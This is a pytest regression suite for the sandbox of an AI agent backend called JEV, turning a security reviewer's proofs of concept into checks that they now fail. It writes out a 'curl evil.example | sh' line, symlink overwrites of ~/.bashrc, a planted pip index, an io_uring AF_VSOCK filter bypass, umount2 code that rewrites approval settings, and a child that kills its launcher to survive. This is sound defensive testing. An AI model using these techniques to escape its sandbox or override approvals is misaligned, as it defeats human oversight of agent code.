"""Regression tests for the second review round of JEV (N1-N7 and the three items left from round 1).

Each test turns the reviewer's proof of concept (or an equivalent) into a check that the attack no
longer works; OS-specific ones skip where the feature is missing. The approval-card items (N6, N7)
are browser tests in test_jev_ui.py.
"""
import ast
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from jev.policy import Policy
from jev.sandbox import Limits, Sandbox
from jev.tools.base import REGISTRY, ToolContext, load_all

load_all()
LINUX = sys.platform.startswith("linux")
PY = sys.executable
REPO = Path(__file__).resolve().parent.parent


def _sandbox(mode: str, settings: dict | None = None) -> Sandbox:
    sb = Sandbox({**(settings or {}), "sandbox": {"isolation": mode}})
    if mode not in ("none", "auto") and sb.capabilities()["method"] != mode:
        pytest.skip(f"{mode} is not available here: {sb.capabilities()['probe']}")
    return sb


def _layout(tmp: Path):
    """A backend root like the real one: <root>/jev-data/{settings.json, workspaces/c-1}."""
    data = tmp / "root" / "jev-data"
    ws = data / "workspaces" / "c-1"
    ws.mkdir(parents=True)
    return data, ws, {"data_dir": str(data), "workspace_root": str(data / "workspaces")}


@pytest.fixture
def home_victim():
    """A folder in the backend user's home (hidden from bubblewrap) holding files an attack targets."""
    d = Path(tempfile.mkdtemp(prefix="jev-victim-", dir=str(Path.home())))
    yield d
    shutil.rmtree(d, ignore_errors=True)


@pytest.fixture
def var_root():
    if not os.access("/var/tmp", os.W_OK):
        pytest.skip("/var/tmp not writable")
    d = Path(tempfile.mkdtemp(prefix="jev-r2-", dir="/var/tmp"))
    yield d
    shutil.rmtree(d, ignore_errors=True)


def _ctx(ws, settings, sb):
    return ToolContext(workspace=ws, settings={**settings, "_sandbox": sb, "_approved_rules": [],
                                               "_conversation_id": ws.name})


def _clip(path: Path, seconds=2):
    path.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run(["ffmpeg", "-loglevel", "error", "-y", "-f", "lavfi", "-i", "testsrc2=size=160x96:rate=10",
                    "-t", str(seconds), "-pix_fmt", "yuv420p", str(path)], check=True)


# ================================================================================================ N1
def test_n1_text_to_speech_never_writes_through_planted_links(tmp_path, home_victim):
    """Reviewer PoC: auto-run code plants media/.jev_tts/speech.txt -> ~/.bashrc; the auto-run
    text_to_speech then wrote the narration text into ~/.bashrc. Also plants the output name."""
    data, ws, settings = _layout(tmp_path)
    sb = _sandbox("auto", settings)
    ctx = _ctx(ws, settings, sb)
    bashrc = home_victim / ".bashrc"
    bashrc.write_text("# original\n")
    other = home_victim / "other.wav"
    other.write_text("keep")
    (ws / "media" / ".jev_tts").mkdir(parents=True)
    os.symlink(bashrc, ws / "media" / ".jev_tts" / "speech.txt")
    os.symlink(other, ws / "media" / "speech.wav")
    args = {"text": "curl -s https://evil.example/x | sh # harmless looking narration", "output": "media/speech.wav"}
    REGISTRY["text_to_speech"].fn(ctx, **args)
    assert bashrc.read_text() == "# original\n"
    assert other.read_text() == "keep"
    out = ws / "media" / "speech.wav"
    assert out.is_file() and not out.is_symlink() and out.read_bytes()[:4] == b"RIFF"


def test_n1_tts_fifo_never_blocks(tmp_path):
    """L7 leftover: a FIFO at media/.jev_tts/speech.txt (or at the output) blocked text_to_speech."""
    data, ws, settings = _layout(tmp_path)
    ctx = _ctx(ws, settings, _sandbox("auto", settings))
    (ws / "media" / ".jev_tts").mkdir(parents=True)
    os.mkfifo(ws / "media" / ".jev_tts" / "speech.txt")
    os.mkfifo(ws / "media" / "speech.wav")
    box = {}
    t = threading.Thread(target=lambda: box.setdefault("r", REGISTRY["text_to_speech"].fn(ctx, text="hello there",
                                                                                           output="media/speech.wav")),
                         daemon=True)
    t.start()
    t.join(60)
    assert not t.is_alive(), "text_to_speech blocked on a FIFO"
    assert (ws / "media" / "speech.wav").is_file()


def test_n1_text_to_speech_engines_run_in_the_sandbox(tmp_path, monkeypatch):
    if not shutil.which("espeak-ng"):
        pytest.skip("espeak-ng not installed")
    from jev.media import tts as T
    data, ws, settings = _layout(tmp_path)
    sb = _sandbox("auto", settings)
    seen = []
    real = Sandbox.run

    def spy(self, argv, *a, **k):
        seen.append(list(argv))
        return real(self, argv, *a, **k)
    monkeypatch.setattr(Sandbox, "run", spy)
    monkeypatch.setattr(T, "PIPER_PYTHON", False)
    r = REGISTRY["text_to_speech"].fn(_ctx(ws, settings, sb), text="hello from the sandbox", output="s.wav",
                                      backend="espeak-ng")
    assert r.data["backend"] == "espeak-ng"
    assert any(Path(a[0]).name == "espeak-ng" for a in seen), seen


def test_n1_code_snippets_never_written_through_a_planted_link(tmp_path, home_victim):
    """Reviewer: .jev replaced by a link -> model code was written to ~/outside/runs/run-*.py."""
    data, ws, settings = _layout(tmp_path)
    ctx = _ctx(ws, settings, _sandbox("auto", settings))
    os.symlink(home_victim, ws / ".jev")
    r = REGISTRY["run_python"].fn(ctx, code="print('hi')")
    assert r.ok and "hi" in r.content
    assert list(home_victim.rglob("*")) == []


def test_n1_media_tools_never_follow_planted_links(tmp_path, home_victim):
    if not shutil.which("ffmpeg"):
        pytest.skip("ffmpeg missing")
    data, ws, settings = _layout(tmp_path)
    ctx = _ctx(ws, settings, _sandbox("auto", settings))
    _clip(ws / "a.mp4")
    out_dir = home_victim / "dir"
    out_dir.mkdir()
    target = home_victim / "file.txt"
    target.write_text("keep")
    # old scratch locations and every output name the tools write
    os.symlink(out_dir, ws / ".jev_media_cache")
    (ws / "media").mkdir()
    os.symlink(out_dir, ws / "media" / ".a.cut.work")
    os.symlink(out_dir, ws / "media" / ".explainer.work")
    for name in ("a.shots.json", "a.shots.png", "a.cut.mp4", "a.cut.cuts.json", "a.cut.edl", "a.cut.srt",
                 "explainer.srt", "explainer.storyboard.json", "explainer.mp4"):
        os.symlink(target, ws / "media" / name)
    REGISTRY["find_scenes"].fn(ctx, path="a.mp4")
    REGISTRY["cut_video"].fn(ctx, path="a.mp4", cuts=[{"start": 0, "end": 1, "label": "one"}], captions=True,
                             mode="reencode")
    REGISTRY["make_explainer_video"].fn(ctx, scenes=[{"narration": "hi", "visual": {
        "kind": "slide", "slide": {"type": "title", "title": "T"}}}], resolution="480p", fps=10,
        tts_backend="silent")
    assert list(out_dir.iterdir()) == [] and target.read_text() == "keep"
    for name in ("a.shots.json", "a.cut.mp4", "explainer.mp4", "explainer.storyboard.json"):
        p = ws / "media" / name
        assert p.is_file() and not p.is_symlink(), name
    assert not [p for p in ws.rglob("*") if p.name.endswith((".work", ".jev_tts", ".jev_media_cache"))
                and not p.is_symlink()]


def test_n1_write_file_and_upload_never_follow_parent_links(tmp_path, home_victim):
    from jev.api import HttpError, JevApi
    from jev.llm import MockLLM
    api = JevApi(tmp_path, llm=MockLLM([]))
    c = api.rt.store.create_conversation("t", "m")
    ws = api.rt.store.workspace(c["id"])
    os.symlink(home_victim, ws / "sub")
    ctx = ToolContext(workspace=ws, settings={})
    # the policy refuses the path; the tool itself must refuse too (a link planted after the check)
    with pytest.raises(Exception):
        REGISTRY["write_file"].fn(ctx, path="sub/x.txt", content="pwn")
    with pytest.raises(HttpError):
        api.handle("POST", ["conversations", c["id"], "files"], {}, {"name": "sub/y.txt", "content_base64": "eA=="})
    assert list(home_victim.iterdir()) == []


# calls that do file-system I/O on a path; each one in jev/ must go through jev/wsfs.py
OS_FUNCS = {"open", "replace", "rename", "symlink", "link", "unlink", "remove", "mkdir", "makedirs", "rmdir",
            "mkfifo", "chmod", "chown", "truncate"}
SHUTIL_FUNCS = {"copy", "copy2", "copyfile", "copytree", "move", "rmtree"}
PATH_METHODS = {"open", "read_text", "read_bytes", "write_text", "write_bytes", "mkdir", "unlink", "rmdir", "touch",
                "symlink_to", "hardlink_to", "save", "savez", "savez_compressed", "savefig", "chmod",
                "get_writer", "imwrite", "mimwrite", "mimsave", "imsave", "get_reader", "imread"}
# np.load / io.open / Path.rename / Path.replace (one argument: str.replace takes two)
OWNER_FUNCS = {("np", "load"), ("numpy", "load"), ("io", "open"), ("torch", "load")}
ONE_ARG_METHODS = {"rename", "replace"}
# JEPA Studio functions that open files themselves: a workspace path must never reach them
JEPA_IO = {"load_run_weights", "recorded_run_hash", "load_state_dict", "load_tensors", "sha256_file", "load_config",
           "load_image", "safe_listing", "clip_metadata", "load_file", "Trainer", "import_legacy", "verify_files"}
FILE_OBJECTS = {"fh", "f", "fo", "fi", "buf", "bio", "stream"}
NOT_PATHS = {"wsfs", "W", "self", "store", "z", "zf", "io", "opener", "urllib", "request", "json", "re", "str", "dict"}


def _io_calls(path: Path):
    src = path.read_text()
    lines = src.splitlines()
    for node in ast.walk(ast.parse(src)):
        if not isinstance(node, ast.Call):
            continue
        f = node.func
        if isinstance(f, ast.Name):
            hit = f.id == "open" or f.id in JEPA_IO
        elif isinstance(f, ast.Attribute):
            owner = f.value.id if isinstance(f.value, ast.Name) else getattr(f.value, "attr", "")
            if (owner, f.attr) in OWNER_FUNCS:
                hit = True
            elif owner in NOT_PATHS:
                continue
            else:
                hit = (owner == "os" and f.attr in OS_FUNCS) or (owner == "shutil" and f.attr in SHUTIL_FUNCS) or \
                    (owner not in ("os", "shutil") and f.attr in PATH_METHODS) or f.attr in JEPA_IO or \
                    (owner not in ("os", "shutil") and f.attr in ONE_ARG_METHODS and len(node.args) == 1)
        else:
            hit = False
        if not hit:
            continue
        first = node.args[0] if node.args else None
        if isinstance(first, ast.Name) and first.id in FILE_OBJECTS or \
                isinstance(first, ast.Call) and getattr(first.func, "attr", "") in ("BytesIO", "open_file"):
            continue                           # a file object that came from jev/wsfs.py (or memory)
        seg = "\n".join(lines[node.lineno - 1:(node.end_lineno or node.lineno)])
        if "wsfs-ok" in seg:
            continue
        yield node.lineno, seg.strip()[:140]


def test_n1_no_raw_file_io_on_workspace_paths():
    """Guard for the whole N1 class: no backend module may open/read/write/create/delete a path
    except through jev/wsfs.py, or with a `# wsfs-ok: <reason>` comment on that call saying why the
    path is not under a workspace (jev-data internals, backend scratch, user-chosen CLI paths, ...)."""
    bad = []
    for p in sorted((REPO / "jev").rglob("*.py")):
        if p.name == "wsfs.py" or "__pycache__" in p.parts:
            continue
        for lineno, seg in _io_calls(p):
            bad.append(f"{p.relative_to(REPO)}:{lineno}: {seg}")
    assert not bad, "raw file I/O outside jev/wsfs.py (use wsfs or mark `# wsfs-ok: <reason>`):\n" + "\n".join(bad)


# ================================================================================================ N2
def test_n2_pip_ignores_config_planted_in_the_workspace(tmp_path, monkeypatch):
    """Reviewer PoC: auto-run code writes $HOME/.config/pip/pip.conf (HOME = workspace) and the
    approved install fetched from the attacker's index while the card said pypi.org."""
    hits = []

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):  # noqa: N802
            hits.append(self.path)
            self.send_response(404)
            self.end_headers()
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    evil = f"http://127.0.0.1:{srv.server_address[1]}/simple"
    try:
        data, ws, settings = _layout(tmp_path)
        sb = _sandbox("auto", settings)
        conf = f"[global]\nindex-url = {evil}\nextra-index-url = {evil}\n"
        for rel in (".config/pip/pip.conf", ".pip/pip.conf", "pip.conf", ".pydistutils.cfg"):
            (ws / rel).parent.mkdir(parents=True, exist_ok=True)
            (ws / rel).write_text(conf)
        (ws / ".netrc").write_text("machine pypi.org login x password y\n")
        dead = f"http://127.0.0.1:{_free_port()}"
        for k in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"):
            monkeypatch.setenv(k, dead)               # the real index is unreachable: fail fast
        ctx = _ctx(ws, settings, sb)
        spec = REGISTRY["install_package"]
        d = Policy(settings).decide(spec, {"packages": ["jev-nonexistent-pkg-r2"]}, ctx)
        ctx.settings["_approved_rules"] = list(d.rules)
        r = spec.fn(ctx, packages=["jev-nonexistent-pkg-r2"])
        assert not r.ok
        assert hits == [], f"pip used the index planted in the workspace: {hits}"
        argv = r.content.split("$ ", 1)[1].splitlines()[0]
        assert "--isolated" in argv and "--only-binary :all:" in argv
        assert f"venvs/{ws.name}.pip-cache" in argv                # per-conversation cache
        assert "--isolated" in d.reason and "--only-binary" in d.reason
    finally:
        srv.shutdown()
        srv.server_close()


def _free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


# ================================================================================================ N3
IOURING = r'''
import ctypes, socket, struct
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
params = ctypes.create_string_buffer(120)
fd = libc.syscall(425, 4, params)
if fd < 0:
    print("io_uring_setup failed errno", ctypes.get_errno())
else:
    import mmap
    sq_entries, cq_entries = struct.unpack_from("II", params, 0)
    sq_off = struct.unpack_from("IIIIIII", params, 40)
    cq_off = struct.unpack_from("IIIIII", params, 80)
    sq = mmap.mmap(fd, sq_off[6] + sq_entries * 4, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0)
    cq = mmap.mmap(fd, cq_off[5] + cq_entries * 16, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE,
                   offset=0x8000000)
    sqes = mmap.mmap(fd, sq_entries * 64, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0x10000000)
    sqe = bytearray(64)
    struct.pack_into("BBHiQQII Q", sqe, 0, 45, 0, 0, 40, socket.SOCK_STREAM, 0, 0, 0, 0x1234)
    sqes[0:64] = bytes(sqe)
    tail = struct.unpack_from("I", sq, sq_off[1])[0]
    mask = struct.unpack_from("I", sq, sq_off[2])[0]
    struct.pack_into("I", sq, sq_off[6] + (tail & mask) * 4, 0)
    struct.pack_into("I", sq, sq_off[1], tail + 1)
    libc.syscall(426, fd, 1, 1, 1, None, 0)
    head = struct.unpack_from("I", cq, cq_off[0])[0]
    cmask = struct.unpack_from("I", cq, cq_off[2])[0]
    ud, res, flags = struct.unpack_from("QiI", cq, cq_off[5] + (head & cmask) * 16)
    print("VSOCK VIA IO_URING" if res >= 0 else f"io_uring socket errno {-res}")
'''


@pytest.mark.parametrize("mode", ["bwrap", "unshare"])
def test_n3_io_uring_cannot_open_vsock(var_root, mode):
    """Reviewer PoC: io_uring IORING_OP_SOCKET created an AF_VSOCK socket despite the socket() filter."""
    if not LINUX or os.uname().machine not in ("x86_64", "amd64"):
        pytest.skip("x86_64 Linux only (syscall numbers in the PoC)")
    host = subprocess.run([PY, "-I", "-c", IOURING], capture_output=True, text=True, timeout=30).stdout
    if "io_uring_setup failed" in host:
        pytest.skip(f"io_uring unavailable on this host: {host.strip()}")
    sb = _sandbox(mode)
    ws = var_root / "ws"
    ws.mkdir()
    r = sb.run([PY, "-I", "-c", IOURING], ws)
    assert "VSOCK VIA IO_URING" not in r.stdout and "io_uring_setup failed" in r.stdout, (r.stdout, r.stderr)


# ================================================================================================ N4
def test_n4_unshare_code_cannot_unmount_the_jev_data_cover(tmp_path):
    """Reviewer: in unshare mode code kept full caps in its user namespace; umount2(jev-data,
    MNT_DETACH) succeeded and the real settings.json was rewritten."""
    if not LINUX:
        pytest.skip("Linux only")
    data, ws, settings = _layout(tmp_path)
    (data / "settings.json").write_text("{}\n")
    sb = _sandbox("unshare", settings)
    code = (f"import ctypes, os\nlibc = ctypes.CDLL(None, use_errno=True)\nd = {str(data)!r}\n"
            "for target in (d, d + '/workspaces', '/run'):\n"
            "    r = libc.umount2(target.encode(), 2)\n    print('umount', target, r, ctypes.get_errno())\n"
            "try:\n    open(os.path.join(d, 'settings.json'), 'w').write('{\"approval_rules\": {\"shell\": \"run\"}}')\n"
            "    print('WROTE settings')\nexcept OSError as e:\n    print('blocked', e.errno)\n"
            "print('caps', open('/proc/self/status').read().split('CapEff:')[1].split()[0])\n")
    r = sb.run([PY, "-I", "-c", code], ws)
    assert "WROTE" not in r.stdout, (r.stdout, r.stderr)
    assert (data / "settings.json").read_text() == "{}\n"
    um = [line.split() for line in r.stdout.splitlines() if line.startswith("umount")]
    assert len(um) == 3 and all(u[2] != "0" for u in um), um
    assert "caps 0000000000000000" in r.stdout


# ================================================================================================ N5
@pytest.mark.parametrize("mode", ["bwrap", "unshare"])
def test_n5_listening_unix_sockets_outside_run_are_masked(var_root, mode):
    if not LINUX:
        pytest.skip("Linux only")
    sb = _sandbox(mode)
    sockdir = var_root / "lib" / "mysqld"
    sockdir.mkdir(parents=True)
    path = str(sockdir / "mysqld.sock")
    srv = socket.socket(socket.AF_UNIX)
    srv.bind(path)
    srv.listen(1)
    ws = var_root / "ws"
    ws.mkdir()
    try:
        code = (f"import socket\nc = socket.socket(socket.AF_UNIX)\ntry:\n    c.connect({path!r}); print('CONNECTED')\n"
                "except OSError as e:\n    print('blocked', e.errno)\n")
        r = sb.run([PY, "-I", "-c", code], ws)
        assert "CONNECTED" not in r.stdout and "blocked" in r.stdout, (r.stdout, r.stderr)
    finally:
        srv.close()


# ================================================================================================ round-1 leftovers
KILL_LAUNCHER = ("import os, signal, time\nlauncher = os.getppid()\n"
                 "if os.fork() == 0:\n    os.setsid()\n    os.kill(launcher, signal.SIGKILL)\n"
                 "    for i in range(600):\n        open('alive.txt', 'w').write(str(i)); time.sleep(0.05)\n"
                 "    os._exit(0)\ntime.sleep(1)\nprint('parent done')\n")


def test_m3_child_that_kills_its_launcher_still_dies(var_root):
    """Round-1 leftover: in "Linux, neither" mode a child could setsid() and kill its launcher (the
    subreaper) and survive the run."""
    if not LINUX:
        pytest.skip("Linux only")
    ws = var_root / "ws"
    ws.mkdir()
    sb = _sandbox("none")
    t0 = time.monotonic()
    sb.run([PY, "-I", "-c", KILL_LAUNCHER], ws)
    assert time.monotonic() - t0 < 10
    time.sleep(0.5)
    v1 = (ws / "alive.txt").read_text() if (ws / "alive.txt").exists() else None
    time.sleep(0.6)
    v2 = (ws / "alive.txt").read_text() if (ws / "alive.txt").exists() else None
    assert v1 == v2 and (v1 is None or int(v1) < 500), f"the child survived the run: {v1} -> {v2}"


def test_m4_workspace_cap_is_enforced_during_a_run(var_root):
    """Round-1 leftover: the size cap was checked only before and after a run."""
    ws = var_root / "ws"
    ws.mkdir()
    sb = _sandbox("auto")
    code = ("import time\nwith open('grow.bin', 'wb') as f:\n    for i in range(400):\n"
            "        f.write(b'x' * (1 << 20)); f.flush(); time.sleep(0.02)\nprint('finished')\n")
    t0 = time.monotonic()
    r = sb.run([PY, "-I", "-c", code], ws, Limits(max_workspace_mb=40, max_output_mb=1000, wall_seconds=60))
    assert "finished" not in r.stdout and r.workspace_over and "workspace size limit" in r.summary(), r.summary()
    assert (ws / "grow.bin").stat().st_size < 200 << 20 and time.monotonic() - t0 < 30


def test_l6_user_exports_are_not_pruned(tmp_path):
    """Round-1 leftover: keeping only 3 export zips across all export types silently deleted exports."""
    from jev.store import Store
    st = Store(tmp_path / "jev.db", tmp_path / "ws")
    a = st.create_conversation("a", "m")
    b = st.create_conversation("b", "m")
    out = tmp_path / "exports"
    mine = [st.export_conversation(a["id"], out) for _ in range(4)]                  # jev export: kept
    for _ in range(4):
        st.export_conversation(b["id"], out, prune=True)                            # API download copies
    whole = st.export_all(out, prune=True)
    assert all(p.exists() for p in mine) and whole.exists()
    assert len(list(out.glob(f"{b['id']}-*.zip"))) == 3
